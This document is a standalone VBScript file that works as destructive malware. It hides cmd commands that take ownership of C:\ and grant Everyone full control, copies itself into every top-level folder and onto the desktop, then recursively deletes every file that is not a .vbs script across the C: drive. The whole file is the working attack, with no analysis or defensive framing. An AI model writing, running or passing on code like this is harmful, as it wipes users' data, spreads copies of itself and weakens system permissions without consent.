Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")
strScriptPath = WScript.ScriptFullName

' Get the path to the desktop folder
strDesktopFolder = objShell.SpecialFolders("Desktop")

' Disable file system access restrictions
objShell.Run "cmd /c takeown /f C:\ /r /d y && icacls C:\ /grant Everyone:F /t", 0, True

' Iterate through all folders in the file explorer
For Each objFolder In objFSO.GetFolder("C:\").SubFolders
    ' Generate a random number for the copy iteration
    randomIteration = Int((1000 * Rnd) + 1)
    
    ' Create a copy of the script in the current folder
    strFolderCopyPath = objFolder.Path & "\Copy" & randomIteration & ".vbs"
    objFSO.CopyFile strScriptPath, strFolderCopyPath, True ' Add "True" to overwrite existing files
    
    ' Create a copy of the script on the desktop
    strDesktopCopyPath = strDesktopFolder & "\Copy" & randomIteration & ".vbs"
    objFSO.CopyFile strScriptPath, strDesktopCopyPath, True ' Add "True" to overwrite existing files
Next

' Reset file system access restrictions
objShell.Run "cmd /c icacls C:\ /reset /t", 0, True

' Delete all files except VBS files within the specified folders
For Each folderPath In objFSO.GetFolder("C:\").SubFolders
    DeleteFilesExceptVBS folderPath.Path
Next

Sub DeleteFilesExceptVBS(folderPath)
    On Error Resume Next
    
    Set folder = objFSO.GetFolder(folderPath)
    If Err.Number = 0 Then
        For Each file In folder.Files
            If LCase(objFSO.GetExtensionName(file.Path)) <> "vbs" Then
                objFSO.DeleteFile file.Path
            End If
        Next
        
        ' Recursively delete files in subfolders
        For Each subfolder In folder.Subfolders
            DeleteFilesExceptVBS subfolder.Path
        Next
    End If
    
    On Error GoTo 0
End Sub
